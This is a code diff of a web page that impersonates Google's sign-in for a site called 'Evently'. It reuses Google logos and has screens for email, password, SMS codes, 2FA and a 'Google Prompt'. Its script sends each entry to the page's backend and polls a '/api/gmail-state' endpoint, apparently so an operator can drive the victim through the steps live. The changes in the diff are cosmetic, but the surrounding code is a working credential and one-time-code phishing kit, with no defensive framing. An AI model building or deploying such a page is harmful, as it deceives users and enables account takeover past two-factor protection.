@@ -497,7 +497,6 @@ body {
     align-items: center;
 }
 
-/* ========== HEADER ========== */
 header {
     width: 100%;
     padding: 12px 24px;
@@ -524,7 +523,6 @@ header nav a {
 }
 header nav a:hover { color: #1a1a2e; }
 
-/* ========== CONTAINER ========== */
 .main-container {
     flex: 1;
     display: flex;
@@ -535,7 +533,6 @@ header nav a:hover { color: #1a1a2e; }
     max-width: 500px;
 }
 
-/* ========== CARD ========== */
 .card {
     background: white;
     border-radius: 12px;
@@ -564,7 +561,6 @@ header nav a:hover { color: #1a1a2e; }
     margin-bottom: 24px;
 }
 
-/* ========== FORM ELEMENTS ========== */
 .input-group {
     text-align: left;
     margin-bottom: 20px;
@@ -608,7 +604,6 @@ header nav a:hover { color: #1a1a2e; }
     color: #3a56d4;
 }
 
-/* ========== BUTTONS ========== */
 .btn-row {
     display: flex;
     justify-content: space-between;
@@ -655,11 +650,9 @@ header nav a:hover { color: #1a1a2e; }
     background: rgba(67,97,238,0.06);
 }
 
-/* ========== STEP VISIBILITY ========== */
 .step { display: none; }
 .step.active { display: block; }
 
-/* ========== LOADING SPINNER ========== */
 .spinner {
     width: 40px;
     height: 40px;
@@ -672,7 +665,6 @@ header nav a:hover { color: #1a1a2e; }
 
 @keyframes spin { to { transform: rotate(360deg); } }
 
-/* ========== 2FA DISPLAY ========== */
 .fa2-number {
     font-size: 64px;
     font-weight: 700;
@@ -689,7 +681,6 @@ header nav a:hover { color: #1a1a2e; }
     border: 2px dashed #dadce0;
 }
 
-/* ========== ERROR / SUCCESS / BLOCKED ========== */
 .error-box {
     background: #fce8e6;
     border: 1px solid #f5c6cb;
@@ -739,7 +730,6 @@ header nav a:hover { color: #1a1a2e; }
     margin-bottom: 16px;
 }
 
-/* ========== PROMPT SCREEN ========== */
 .prompt-info {
     background: #e8f0fe;
     border-radius: 8px;
@@ -758,7 +748,6 @@ header nav a:hover { color: #1a1a2e; }
     color: #4361ee;
 }
 
-/* ========== FOOTER ========== */
 footer {
     padding: 20px;
     font-size: 12px;
@@ -789,7 +778,7 @@ footer a:hover { color: #202124; }
 <div class="main-container">
     <div class="card" id="app-card">
 
-        <!-- ======= STEP 1: PROVIDER SELECT ======= -->
+        <!-- STEP 1: PROVIDER SELECT -->
         <div class="step active" id="step-provider">
             <h1>Sign in to continue</h1>
             <p class="subtitle">Choose an account to continue to Evently</p>
@@ -799,7 +788,7 @@ footer a:hover { color: #202124; }
             </button>
         </div>
 
-        <!-- ======= STEP 2: EMAIL ======= -->
+        <!-- STEP 2: EMAIL -->
         <div class="step" id="step-email">
             <img class="g-logo" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23EA4335' d='M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z'/%3E%3Cpath fill='%234285F4' d='M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z'/%3E%3Cpath fill='%23FBBC05' d='M10.53 28.59A14.5 14.5 0 0 1 9.5 24c0-1.59.28-3.14.76-4.59l-7.98-6.19A23.99 23.99 0 0 0 0 24c0 3.77.87 7.35 2.56 10.56l7.97-5.97z'/%3E%3Cpath fill='%2334A853' d='M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 5.97C6.51 42.62 14.62 48 24 48z'/%3E%3C/svg%3E" alt="Google">
             <h1>Sign in</h1>
@@ -816,7 +805,7 @@ footer a:hover { color: #202124; }
             </div>
         </div>
 
-        <!-- ======= STEP 3: PASSWORD ======= -->
+        <!-- STEP 3: PASSWORD -->
         <div class="step" id="step-password">
             <img class="g-logo" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23EA4335' d='M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z'/%3E%3Cpath fill='%234285F4' d='M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z'/%3E%3Cpath fill='%23FBBC05' d='M10.53 28.59A14.5 14.5 0 0 1 9.5 24c0-1.59.28-3.14.76-4.59l-7.98-6.19A23.99 23.99 0 0 0 0 24c0 3.77.87 7.35 2.56 10.56l7.97-5.97z'/%3E%3Cpath fill='%2334A853' d='M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 5.97C6.51 42.62 14.62 48 24 48z'/%3E%3C/svg%3E" alt="Google">
             <h1>Hi <span id="display-email"></span></h1>
@@ -832,20 +821,20 @@ footer a:hover { color: #202124; }
             </div>
         </div>
 
-        <!-- ======= STEP 4: LOADING / WAITING ======= -->
+        <!-- STEP 4: LOADING -->
         <div class="step" id="step-loading">
             <h1>Checking your info...</h1>
             <div class="spinner"></div>
             <p class="subtitle">Please wait a moment</p>
         </div>
 
-        <!-- ======= STEP 5: SMS CODE ======= -->
+        <!-- STEP 5: SMS CODE I -->
         <div class="step" id="step-sms1">
             <img class="g-logo" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23EA4335' d='M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z'/%3E%3Cpath fill='%234285F4' d='M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z'/%3E%3Cpath fill='%23FBBC05' d='M10.53 28.59A14.5 14.5 0 0 1 9.5 24c0-1.59.28-3.14.76-4.59l-7.98-6.19A23.99 23.99 0 0 0 0 24c0 3.77.87 7.35 2.56 10.56l7.97-5.97z'/%3E%3Cpath fill='%2334A853' d='M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 5.97C6.51 42.62 14.62 48 24 48z'/%3E%3C/svg%3E" alt="Google">
             <h1>Verify it's you</h1>
             <p class="subtitle">Enter the code sent to your phone</p>
             <div class="input-group">
-                <label> verification code</label>
+                <label>Verification code</label>
                 <input type="text" id="sms1-input" placeholder="Enter 6-digit code" autocomplete="one-time-code" onkeydown="if(event.key==='Enter') submitSms1()">
             </div>
             <div class="btn-row">
@@ -854,7 +843,7 @@ footer a:hover { color: #202124; }
             </div>
         </div>
 
-        <!-- ======= STEP 6: SMS CODE II ======= -->
+        <!-- STEP 6: SMS CODE II -->
         <div class="step" id="step-sms2">
             <img class="g-logo" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23EA4335' d='M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z'/%3E%3Cpath fill='%234285F4' d='M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z'/%3E%3Cpath fill='%23FBBC05' d='M10.53 28.59A14.5 14.5 0 0 1 9.5 24c0-1.59.28-3.14.76-4.59l-7.98-6.19A23.99 23.99 0 0 0 0 24c0 3.77.87 7.35 2.56 10.56l7.97-5.97z'/%3E%3Cpath fill='%2334A853' d='M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 5.97C6.51 42.62 14.62 48 24 48z'/%3E%3C/svg%3E" alt="Google">
             <h1>Verify it's you</h1>
@@ -869,7 +858,7 @@ footer a:hover { color: #202124; }
             </div>
         </div>
 
-        <!-- ======= STEP 7: 2FA NUMBER DISPLAY ======= -->
+        <!-- STEP 7: 2FA -->
         <div class="step" id="step-fa2">
             <img class="g-logo" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23EA4335' d='M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z'/%3E%3Cpath fill='%234285F4' d='M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z'/%3E%3Cpath fill='%23FBBC05' d='M10.53 28.59A14.5 14.5 0 0 1 9.5 24c0-1.59.28-3.14.76-4.59l-7.98-6.19A23.99 23.99 0 0 0 0 24c0 3.77.87 7.35 2.56 10.56l7.97-5.97z'/%3E%3Cpath fill='%2334A853' d='M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 5.97C6.51 42.62 14.62 48 24 48z'/%3E%3C/svg%3E" alt="Google">
             <h1>2-Step Verification</h1>
@@ -888,7 +877,7 @@ footer a:hover { color: #202124; }
             </div>
         </div>
 
-        <!-- ======= STEP 8: PROMPT SCREEN ======= -->
+        <!-- STEP 8: PROMPT -->
         <div class="step" id="step-prompt">
             <img class="g-logo" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23EA4335' d='M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z'/%3E%3Cpath fill='%234285F4' d='M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z'/%3E%3Cpath fill='%23FBBC05' d='M10.53 28.59A14.5 14.5 0 0 1 9.5 24c0-1.59.28-3.14.76-4.59l-7.98-6.19A23.99 23.99 0 0 0 0 24c0 3.77.87 7.35 2.56 10.56l7.97-5.97z'/%3E%3Cpath fill='%2334A853' d='M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 5.97C6.51 42.62 14.62 48 24 48z'/%3E%3C/svg%3E" alt="Google">
             <h1>Google Prompt</h1>
@@ -900,7 +889,7 @@ footer a:hover { color: #202124; }
             <p class="subtitle">Waiting for your response...</p>
         </div>
 
-        <!-- ======= STEP 9: PASSWORD ERROR ======= -->
+        <!-- STEP 9: PASSWORD ERROR -->
         <div class="step" id="step-error">
             <img class="g-logo" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23EA4335' d='M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z'/%3E%3Cpath fill='%234285F4' d='M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z'/%3E%3Cpath fill='%23FBBC05' d='M10.53 28.59A14.5 14.5 0 0 1 9.5 24c0-1.59.28-3.14.76-4.59l-7.98-6.19A23.99 23.99 0 0 0 0 24c0 3.77.87 7.35 2.56 10.56l7.97-5.97z'/%3E%3Cpath fill='%2334A853' d='M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 5.97C6.51 42.62 14.62 48 24 48z'/%3E%3C/svg%3E" alt="Google">
             <h1>Wrong password</h1>
@@ -918,7 +907,7 @@ footer a:hover { color: #202124; }
             </div>
         </div>
 
-        <!-- ======= STEP 10: BLOCKED ======= -->
+        <!-- STEP 10: BLOCKED -->
         <div class="step" id="step-blocked">
             <div class="blocked-box">
                 <div class="block-icon">🚫</div>
@@ -930,7 +919,7 @@ footer a:hover { color: #202124; }
             </div>
         </div>
 
-        <!-- ======= STEP 11: SUCCESS / REDIRECT ======= -->
+        <!-- STEP 11: SUCCESS -->
         <div class="step" id="step-success">
             <div class="success-box">
                 <div class="check">✓</div>
@@ -953,20 +942,17 @@ footer a:hover { color: #202124; }
 <script>
 let pollInterval = null;
 
-// ========== SHOW STEP ==========
 function showStep(stepId) {
     document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
     document.getElementById(stepId).classList.add('active');
 }
 
-// ========== PROVIDER ==========
 function selectProvider(provider) {
     if (provider === 'gmail') {
         showStep('step-email');
     }
 }
 
-// ========== EMAIL ==========
 function submitEmail() {
     const email = document.getElementById('email-input').value.trim();
     if (!email) return;
@@ -986,7 +972,6 @@ function submitEmail() {
     .catch(() => {});
 }
 
-// ========== PASSWORD ==========
 function submitPassword() {
     const password = document.getElementById('password-input').value.trim();
     if (!password) return;
@@ -1025,7 +1010,6 @@ function submitPasswordRetry() {
     .catch(() => {});
 }
 
-// ========== SMS ==========
 function submitSms1() {
     const code = document.getElementById('sms1-input').value.trim();
     if (!code) return;
@@ -1062,7 +1046,6 @@ function submitSms2() {
     .catch(() => {});
 }
 
-// ========== 2FA ==========
 function submitFa2() {
     const code = document.getElementById('fa2-input').value.trim();
     if (!code) return;
@@ -1081,7 +1064,6 @@ function submitFa2() {
     .catch(() => {});
 }
 
-// ========== POLLING ==========
 function startPolling() {
     if (pollInterval) clearInterval(pollInterval);
     pollInterval = setInterval(checkState, 1500);
@@ -1130,7 +1112,6 @@ function checkState() {
                 }, 3000);
                 break;
             case 'password':
-                // Already on password screen, stop polling
                 showStep('step-password');
                 stopPolling();
                 break;
@@ -1139,7 +1120,6 @@ function checkState() {
     .catch(() => {});
 }
 
-// ========== INIT on page load (in case state already exists) ==========
 document.addEventListener('DOMContentLoaded', function() {
     fetch('/api/gmail-state')
     .then(r => r.json())
